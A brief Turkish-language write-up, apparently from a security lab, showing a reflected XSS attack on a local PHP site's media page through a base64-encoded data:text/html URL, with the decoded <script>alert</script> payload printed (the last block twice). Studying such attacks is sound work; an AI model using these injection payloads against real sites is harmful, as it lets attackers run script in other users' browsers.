# XSS Attack Example

Bu örnek, base64 kodlanmış bir payload kullanarak bir XSS saldırısını göstermektedir. Media kısmı, arka planda base64 ile gelen veriyi çözümler ve siteye gönderir. Ancak, biz bu durumu manipüle ederek XSS saldırısı gerçekleştiriyoruz.

URL:
```
http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzIFRlc3QnKTwvc2NyaXB0Pg==
```

Çözülmüş Payload:
```
<script>alert('xss Test');</script>
```

Yukarıdaki URL erişildiğinde, aşağıdaki script çalıştırılacaktır:
```html
<script>alert('xss Test');</script>
```
```html
<script>alert('xss Test');</script>
```